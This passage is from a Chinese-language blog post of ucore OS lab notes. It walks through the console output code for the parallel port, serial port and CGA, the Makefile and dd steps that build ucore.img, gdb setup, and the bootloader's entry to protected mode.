<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LPTPORT         0x378</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lpt_putc</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">        lpt_putc_sub(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        lpt_putc_sub(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">        lpt_putc_sub(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        lpt_putc_sub(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lpt_putc_sub</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; !(inb(LPTPORT + <span class="number">1</span>) &amp; <span class="number">0x80</span>) &amp;&amp; i &lt; <span class="number">12800</span>; i ++) &#123;</span><br><span class="line">        delay(); <span class="comment">/* 读I/O端口地址0x379,等待并口准备好 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    outb(LPTPORT + <span class="number">0</span>, c); <span class="comment">/* 向I/O端口地址0x378发出要输出的字符 */</span></span><br><span class="line">    outb(LPTPORT + <span class="number">2</span>, <span class="number">0x08</span> | <span class="number">0x04</span> | <span class="number">0x01</span>); <span class="comment">/* 向I/O端口地址0x37A发出控制命令 */</span></span><br><span class="line">    outb(LPTPORT + <span class="number">2</span>, <span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在I/O端口port写入一个字节的data */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">outb</span><span class="params">(<span class="keyword">uint16_t</span> port, <span class="keyword">uint8_t</span> data)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;outb %0, %1&quot;</span> :: <span class="string">&quot;a&quot;</span> (data), <span class="string">&quot;d&quot;</span> (port))</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从I/O端口port读取一个字节 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint8_t</span> <span class="title">inb</span><span class="params">(<span class="keyword">uint16_t</span> port)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> data;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;inb %1, %0&quot;</span> : <span class="string">&quot;=a&quot;</span> (data) : <span class="string">&quot;d&quot;</span> (port))</span></span>;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 一种笨的滞后时间控制:通过无意义指令的执行来达到延时的目的 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delay</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    inb(<span class="number">0x84</span>); </span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>读I/O端口地址 0x379，等待并口准备好</li>
<li>向I/O端口地址 0x378 发出要输出的字符</li>
<li>向I/O端口地址 0x37A 发出控制命令，让并口处理要输出的字符</li>
</ul>
<p>在 bootmain.c 中的 serial_putc 函数（定义在 console.c 中）完成了<strong>串口输出字符</strong>的工作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM1            0x3F8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_TX          0       <span class="comment">// Out: Transmit buffer (DLAB=0)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_LSR         5       <span class="comment">// In:  Line Status Register</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_LSR_TXRDY   0x20    <span class="comment">// Transmit buffer avail</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serial_putc</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">        serial_putc_sub(c); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        serial_putc_sub(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">        serial_putc_sub(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        serial_putc_sub(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serial_putc_sub</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="number">12800</span>; i ++) &#123;</span><br><span class="line">        delay(); <span class="comment">/* 读I/O端口地址0x3f8+5获得LSR寄存器的值，等待串口输出准备好 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    outb(COM1 + COM_TX, c); <span class="comment">/* 向I/O端口地址0x3f8发出要输出的字符 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>读I/O端口地址 0x3f8+5 获得LSR寄存器的值，等待串口输出准备好</li>
<li>向I/O端口地址 0x3f8 发出要输出的字符</li>
</ul>
<p>在 bootmain.c 中的 cga_putc 函数（定义在 console.c 中）完成了 CGA 字符方式在某位置输出字符的工作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRT_ROWS        25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRT_COLS        80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRT_SIZE        (CRT_ROWS * CRT_COLS)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">uint16_t</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> *crt_buf;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> crt_pos;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> addr_6845;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">cga_putc</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// set black on white</span></span><br><span class="line">    <span class="keyword">if</span> (!(c &amp; ~<span class="number">0xFF</span>)) &#123;</span><br><span class="line">        c |= <span class="number">0x0700</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (c &amp; <span class="number">0xff</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\b&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> (crt_pos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            crt_pos --;</span><br><span class="line">            crt_buf[crt_pos] = (c &amp; ~<span class="number">0xff</span>) | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        crt_pos += CRT_COLS;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\r&#x27;</span>:</span><br><span class="line">        crt_pos -= (crt_pos % CRT_COLS);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        crt_buf[crt_pos ++] = c;     <span class="comment">// write the character</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// What is the purpose of this?</span></span><br><span class="line">    <span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i ++) &#123;</span><br><span class="line">            crt_buf[i] = <span class="number">0x0700</span> | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        crt_pos -= CRT_COLS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// move that little blinky thing</span></span><br><span class="line">    outb(addr_6845, <span class="number">14</span>);</span><br><span class="line">    outb(addr_6845 + <span class="number">1</span>, crt_pos &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    outb(addr_6845, <span class="number">15</span>);</span><br><span class="line">    outb(addr_6845 + <span class="number">1</span>, crt_pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>写I/O端口地址0x3d4，读I/O端口地址0x3d5，获得当前光标位置</li>
<li>在光标的下一位置的显存地址空间上写字符，格式是黑色背景/白色字符</li>
<li>设置当前光标位置为下一位置</li>
</ul>
<h2 id="练习1-镜像文件的生成"><a href="#练习1-镜像文件的生成" class="headerlink" title="练习1 - 镜像文件的生成"></a>练习1 - 镜像文件的生成</h2><p>关于这部分，我觉得现在还不急着去分析 Makefile 的具体内容，就挂一下答案了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bin</span>/ucore.img</span><br><span class="line">| 生成ucore.img的相关代码为</span><br><span class="line">| $(UCOREIMG): $(kernel) $(bootblock)</span><br><span class="line">|	$(V)dd <span class="keyword">if</span>=/dev/zero of=$@ count=<span class="number">10000</span></span><br><span class="line">|	$(V)dd <span class="keyword">if</span>=$(bootblock) of=$@ conv=notrunc</span><br><span class="line">|	$(V)dd <span class="keyword">if</span>=$(kernel) of=$@ seek=<span class="number">1</span> conv=notrunc</span><br><span class="line">|</span><br><span class="line">| 为了生成ucore.img，首先需要生成bootblock、kernel</span><br><span class="line">|</span><br><span class="line">|&gt;	<span class="built_in">bin</span>/bootblock</span><br><span class="line">|	| 生成bootblock的相关代码为</span><br><span class="line">|	| $(bootblock): $(call toobj,$(bootfiles)) | $(call totarget,sign)</span><br><span class="line">|	|	@echo + ld $@</span><br><span class="line">|	|	$(V)$(LD) $(LDFLAGS) -N -e start -Ttext <span class="number">0x7C00</span> $^ \</span><br><span class="line">|	|		-o $(call toobj,bootblock)</span><br><span class="line">|	|	@$(OBJDUMP) -S $(call objfile,bootblock) &gt; \</span><br><span class="line">|	|		$(call asmfile,bootblock)</span><br><span class="line">|	|	@$(OBJCOPY) -S -O binary $(call objfile,bootblock) \</span><br><span class="line">|	|		$(call outfile,bootblock)</span><br><span class="line">|	|	@$(call totarget,sign) $(call outfile,bootblock) $(bootblock)</span><br><span class="line">|	|</span><br><span class="line">|	| 为了生成bootblock，首先需要生成bootasm.o、bootmain.o、sign</span><br><span class="line">|	|</span><br><span class="line">|	|&gt;	obj/boot/bootasm.o, obj/boot/bootmain.o</span><br><span class="line">|	|	| 生成bootasm.o,bootmain.o的相关makefile代码为</span><br><span class="line">|	|	| bootfiles = $(call listf_cc,boot) </span><br><span class="line">|	|	| $(foreach f,$(bootfiles),$(call cc_compile,$(f),$(CC),\</span><br><span class="line">|	|	|	$(CFLAGS) -Os -nostdinc))</span><br><span class="line">|	|	| 实际代码由宏批量生成</span><br><span class="line">|	|	| </span><br><span class="line">|	|	| 生成bootasm.o需要bootasm.S</span><br><span class="line">|	|	| 实际命令为</span><br><span class="line">|	|	| gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs \</span><br><span class="line">|	|	| 	-nostdinc  -fno-stack-protector -Ilibs/ -Os -nostdinc \</span><br><span class="line">|	|	| 	-c boot/bootasm.S -o obj/boot/bootasm.o</span><br><span class="line">|	|	| 其中关键的参数为</span><br><span class="line">|	|	| 	-ggdb  生成可供gdb使用的调试信息。这样才能用qemu+gdb来调试bootloader <span class="keyword">or</span> ucore。</span><br><span class="line">|	|	|	-m32  生成适用于<span class="number">32</span>位环境的代码。我们用的模拟硬件是32bit的<span class="number">80386</span>，所以ucore也要是<span class="number">32</span>位的软件。</span><br><span class="line">|	|	| 	-gstabs  生成stabs格式的调试信息。这样要ucore的monitor可以显示出便于开发者阅读的函数调用栈信息</span><br><span class="line">|	|	| 	-nostdinc  不使用标准库。标准库是给应用程序用的，我们是编译ucore内核，OS内核是提供服务的，所以所有的服务要自给自足。</span><br><span class="line">|	|	|	-fno-stack-protector  不生成用于检测缓冲区溢出的代码。这是<span class="keyword">for</span> 应用程序的，我们是编译内核，ucore内核好像还用不到此功能。</span><br><span class="line">|	|	| 	-Os  为减小代码大小而进行优化。根据硬件spec，主引导扇区只有<span class="number">512</span>字节，我们写的简单bootloader的最终大小不能大于<span class="number">510</span>字节。</span><br><span class="line">|	|	| 	-I&lt;<span class="built_in">dir</span>&gt;  添加搜索头文件的路径</span><br><span class="line">|	|	| </span><br><span class="line">|	|	| 生成bootmain.o需要bootmain.c</span><br><span class="line">|	|	| 实际命令为</span><br><span class="line">|	|	| gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc \</span><br><span class="line">|	|	| 	-fno-stack-protector -Ilibs/ -Os -nostdinc \</span><br><span class="line">|	|	| 	-c boot/bootmain.c -o obj/boot/bootmain.o</span><br><span class="line">|	|	| 新出现的关键参数有</span><br><span class="line">|	|	| 	-fno-builtin  除非用__builtin_前缀，</span><br><span class="line">|	|	|	              否则不进行builtin函数的优化</span><br><span class="line">|	|</span><br><span class="line">|	|&gt;	<span class="built_in">bin</span>/sign</span><br><span class="line">|	|	| 生成sign工具的makefile代码为</span><br><span class="line">|	|	| $(call add_files_host,tools/sign.c,sign,sign)</span><br><span class="line">|	|	| $(call create_target_host,sign,sign)</span><br><span class="line">|	|	| </span><br><span class="line">|	|	| 实际命令为</span><br><span class="line">|	|	| gcc -Itools/ -g -Wall -O2 -c tools/sign.c \</span><br><span class="line">|	|	| 	-o obj/sign/tools/sign.o</span><br><span class="line">|	|	| gcc -g -Wall -O2 obj/sign/tools/sign.o -o <span class="built_in">bin</span>/sign</span><br><span class="line">|	|</span><br><span class="line">|	| 首先生成bootblock.o</span><br><span class="line">|	| ld -m    elf_i386 -nostdlib -N -e start -Ttext <span class="number">0x7C00</span> \</span><br><span class="line">|	|	obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o</span><br><span class="line">|	| 其中关键的参数为</span><br><span class="line">|	|	-m &lt;emulation&gt;  模拟为i386上的连接器</span><br><span class="line">|	|	-nostdlib  不使用标准库</span><br><span class="line">|	|	-N  设置代码段和数据段均可读写</span><br><span class="line">|	|	-e &lt;entry&gt;  指定入口</span><br><span class="line">|	|	-Ttext  制定代码段开始位置</span><br><span class="line">|	|</span><br><span class="line">|	| 拷贝二进制代码bootblock.o到bootblock.out</span><br><span class="line">|	| objcopy -S -O binary obj/bootblock.o obj/bootblock.out</span><br><span class="line">|	| 其中关键的参数为</span><br><span class="line">|	|	-S  移除所有符号和重定位信息</span><br><span class="line">|	|	-O &lt;bfdname&gt;  指定输出格式</span><br><span class="line">|	|</span><br><span class="line">|	| 使用sign工具处理bootblock.out，生成bootblock</span><br><span class="line">|	| <span class="built_in">bin</span>/sign obj/bootblock.out <span class="built_in">bin</span>/bootblock</span><br><span class="line">|</span><br><span class="line">|&gt;	<span class="built_in">bin</span>/kernel</span><br><span class="line">|	| 生成kernel的相关代码为</span><br><span class="line">|	| $(kernel): tools/kernel.ld</span><br><span class="line">|	| $(kernel): $(KOBJS)</span><br><span class="line">|	| 	@echo + ld $@</span><br><span class="line">|	| 	$(V)$(LD) $(LDFLAGS) -T tools/kernel.ld -o $@ $(KOBJS)</span><br><span class="line">|	| 	@$(OBJDUMP) -S $@ &gt; $(call asmfile,kernel)</span><br><span class="line">|	| 	@$(OBJDUMP) -t $@ | $(SED) <span class="string">&#x27;1,/SYMBOL TABLE/d; s/ .* / /; \</span></span><br><span class="line"><span class="string">|	| 		/^$$/d&#x27;</span> &gt; $(call symfile,kernel)</span><br><span class="line">|	| </span><br><span class="line">|	| 为了生成kernel，首先需要 kernel.ld init.o readline.o stdio.o kdebug.o</span><br><span class="line">|	|	kmonitor.o panic.o clock.o console.o intr.o picirq.o trap.o</span><br><span class="line">|	|	trapentry.o vectors.o pmm.o  printfmt.o string.o</span><br><span class="line">|	| kernel.ld已存在</span><br><span class="line">|	|</span><br><span class="line">|	|&gt;	obj/kern/*/*.o </span><br><span class="line">|	|	| 生成这些.o文件的相关makefile代码为</span><br><span class="line">|	|	| $(call add_files_cc,$(call listf_cc,$(KSRCDIR)),kernel,\</span><br><span class="line">|	|	|	$(KCFLAGS))</span><br><span class="line">|	|	| 这些.o生成方式和参数均类似，仅举init.o为例，其余不赘述</span><br><span class="line">|	|&gt;	obj/kern/init/init.o</span><br><span class="line">|	|	| 编译需要init.c</span><br><span class="line">|	|	| 实际命令为</span><br><span class="line">|	|	|	gcc -Ikern/init/ -fno-builtin -Wall -ggdb -m32 \</span><br><span class="line">|	|	|		-gstabs -nostdinc  -fno-stack-protector \</span><br><span class="line">|	|	|		-Ilibs/ -Ikern/debug/ -Ikern/driver/ \</span><br><span class="line">|	|	|		-Ikern/trap/ -Ikern/mm/ -c kern/init/init.c \</span><br><span class="line">|	|	|		-o obj/kern/init/init.o</span><br><span class="line">|	| </span><br><span class="line">|	| 生成kernel时，makefile的几条指令中有@前缀的都不必需</span><br><span class="line">|	| 必需的命令只有</span><br><span class="line">|	| ld -m    elf_i386 -nostdlib -T tools/kernel.ld -o <span class="built_in">bin</span>/kernel \</span><br><span class="line">|	| 	obj/kern/init/init.o obj/kern/libs/readline.o \</span><br><span class="line">|	| 	obj/kern/libs/stdio.o obj/kern/debug/kdebug.o \</span><br><span class="line">|	| 	obj/kern/debug/kmonitor.o obj/kern/debug/panic.o \</span><br><span class="line">|	| 	obj/kern/driver/clock.o obj/kern/driver/console.o \</span><br><span class="line">|	| 	obj/kern/driver/intr.o obj/kern/driver/picirq.o \</span><br><span class="line">|	| 	obj/kern/trap/trap.o obj/kern/trap/trapentry.o \</span><br><span class="line">|	| 	obj/kern/trap/vectors.o obj/kern/mm/pmm.o \</span><br><span class="line">|	| 	obj/libs/printfmt.o obj/libs/string.o</span><br><span class="line">|	| 其中新出现的关键参数为</span><br><span class="line">|	|	-T &lt;scriptfile&gt;  让连接器使用指定的脚本</span><br><span class="line">|</span><br><span class="line">| 生成一个有<span class="number">10000</span>个块的文件，每个块默认<span class="number">512</span>字节，用<span class="number">0</span>填充</span><br><span class="line">| dd <span class="keyword">if</span>=/dev/zero of=<span class="built_in">bin</span>/ucore.img count=<span class="number">10000</span></span><br><span class="line">|</span><br><span class="line">| 把bootblock中的内容写到第一个块</span><br><span class="line">| dd <span class="keyword">if</span>=<span class="built_in">bin</span>/bootblock of=<span class="built_in">bin</span>/ucore.img conv=notrunc</span><br><span class="line">|</span><br><span class="line">| 从第二个块开始写kernel中的内容</span><br><span class="line">| dd <span class="keyword">if</span>=<span class="built_in">bin</span>/kernel of=<span class="built_in">bin</span>/ucore.img seek=<span class="number">1</span> conv=notrunc</span><br></pre></td></tr></table></figure>
<p>简单分析一下其中的内容：</p>
<ul>
<li>dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换</li>
<li>if=文件名：输入文件名，缺省为标准输入，即指定源文件 &lt; if=input file &gt;</li>
<li>of=文件名：输出文件名，缺省为标准输出，即指定目的文件 &lt; of=output file &gt;</li>
<li>count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数</li>
<li>conv=conversion：用指定的参数转换文件</li>
<li>conv=notrunc：不截短输出文件</li>
</ul>
<p>简述过程：</p>
<ul>
<li>由上描述可以看出，首先先创建一个大小为10000字节的块，然后再将bootblock，kernel拷贝过去，然而生成 ucore.img 需要先生成kernel和bootblock</li>
<li>Makefile通过一系列命令生成了bootblock和kernel这两个elf文件，之后通过dd命令将bootblock放到第一个sector，将kernel放到第二个sector开始的区域（可以明显看出bootblock就是引导区，kernel则是操作系统内核）</li>
<li>而在这之前还通过sign对bootblock进行了修饰，在512个字节的最后两个字节写入了0x55AA，作为引导区的标记</li>
</ul>
<h2 id="练习2-单步跟踪BIOS的执行"><a href="#练习2-单步跟踪BIOS的执行" class="headerlink" title="练习2 - 单步跟踪BIOS的执行"></a>练习2 - 单步跟踪BIOS的执行</h2><p>没什么好写的，make debug 后就可以“任意发挥”了</p>
<p>记得在 tools/gdbinit 结尾加上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b *<span class="number">0x7c00</span></span><br><span class="line">c</span><br><span class="line">x /<span class="number">10</span>i $pc</span><br></pre></td></tr></table></figure>
<p>这是为了方便 <strong>练习3</strong> 而做出的操作，因为程序会默认在“kern_init”处打断点，直接跳过了bootloader </p>
<h2 id="练习3-分析bootloader进入保护模式的过程"><a href="#练习3-分析bootloader进入保护模式的过程" class="headerlink" title="练习3 - 分析bootloader进入保护模式的过程"></a>练习3 - 分析bootloader进入保护模式的过程</h2><p><strong>打开A20门</strong></p>
<p>在PC及其兼容机的第20根地址线比较特殊，计算机系统中一般安排一个“门”控制该地址线是否有效，为了访问1M以上的存储单元，应该打开A20门，这种设置与实模式下只使用低端1M字节存储空间有关，与处理器是否工作在实方式还是保护方式无关（即是关掉A20，也可以进入保护模式）</p>
<p>注：在 8086 中有 20 根地址总线，通过 CS:IP 对的方式寻址，最大访问地址为 1MB </p>
<p>先执行一下指令，方便观察程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) layout <span class="keyword">asm</span></span><br></pre></td></tr></table></figure>
<p>首先清理环境：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">│B+&gt;<span class="number">0x7c00</span>      cli	<span class="comment">// 禁止中断发生</span></span><br><span class="line">│   <span class="number">0x7c01</span>      cld <span class="comment">// 将标志寄存器flag的方向标志位df清零                           </span></span><br><span class="line">│   <span class="number">0x7c02</span>      <span class="keyword">xor</span>    %eax,%eax <span class="comment">// 异或eax把其填充为&#x27;0&#x27;    </span></span><br><span class="line">│   <span class="number">0x7c04</span>      mov    %eax,%ds <span class="comment">// 置空ds               </span></span><br><span class="line">│   <span class="number">0x7c06</span>      mov    %eax,%es <span class="comment">// 置空es              </span></span><br><span class="line">│   <span class="number">0x7c08</span>      mov    %eax,%ss <span class="comment">// 置空ss          </span></span><br><span class="line">│   <span class="number">0x7c0a</span>      in     $<span class="number">0x64</span>,%al <span class="comment">// 从0x64端口读取一字节数据到AL</span></span><br></pre></td></tr></table></figure>
<p>开启A20：通过将键盘控制器上的A20线置于高电位，使全部32条地址线可用（可以访问4G的内存空间）</p>
